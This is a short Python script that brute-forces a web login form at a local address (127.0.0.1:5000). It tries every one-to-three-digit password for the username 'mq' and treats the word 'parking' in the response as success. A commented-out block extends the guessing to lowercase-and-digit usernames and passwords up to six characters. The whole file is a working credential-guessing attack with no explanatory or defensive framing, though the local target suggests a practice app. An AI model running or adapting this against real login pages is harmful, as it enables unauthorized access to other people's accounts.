import requests
import itertools
import string

url = 'http://127.0.0.1:5000/login'

def attempt_login(username, password):
    payload = {'username': username, 'password': password}
    response = requests.post(url, data=payload)
    print(f"Attempted login with Username: {username}, Password: {password}, Content: {response.content}")
    if "parking" in response.text:
        print(f"Success! Username: {username}, Password: {password}")
        return True
    
    return False

username = "mq"
for password_length in range(1, 4):
    for password in itertools.product(string.digits, repeat=password_length):
        password_str = ''.join(password)
        if attempt_login(username, password_str):
            exit()

'''for username_length in range(1, 7):
    for password_length in range(1, 7):
        for username in itertools.product(string.ascii_lowercase + string.digits, repeat=username_length):
            for password in itertools.product(string.ascii_lowercase + string.digits, repeat=password_length):
                password_str = ''.join(password)
        
                if attempt_login(username, password_str):
                   exit()'''
